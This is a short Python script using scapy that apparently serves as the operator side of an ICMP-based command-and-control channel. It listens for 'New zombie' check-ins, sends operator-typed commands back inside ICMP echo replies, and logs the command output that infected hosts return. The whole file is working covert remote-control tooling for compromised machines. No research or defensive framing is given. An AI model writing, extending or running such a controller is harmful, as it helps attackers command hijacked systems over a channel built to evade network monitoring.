from scapy.all import *
from scapy.layers.inet import IP, ICMP

log_file_path = "output.log"

def run_command(pkt):
    try:
        cmd = pkt[Raw].load.decode().strip()
        print(f"Received command: {cmd}")

        if cmd == "New zombie":
            command_to_execute = input("Please enter the next command to zombie: ")
            print(f"Executing command: {command_to_execute}")
            send_icmp_response(pkt, command_to_execute)
        elif cmd.startswith("Output: "):
            output = cmd
            print(f"Received output: {output}")
            log_output(output)

    except Exception as ex:
        error_msg = f"Failed to process command: {str(ex)}"
        send_icmp_response(pkt, error_msg)

def send_icmp_response(pkt, message):
    reply = IP(dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / message
    send(reply)
    print(f"Sent ICMP response to {pkt[IP].src}: {message}")

def log_output(output):
    with open(log_file_path, "a") as log_file:
        log_file.write(output + "\n")

if __name__ == '__main__':
    sniff(filter="icmp", prn=run_command)
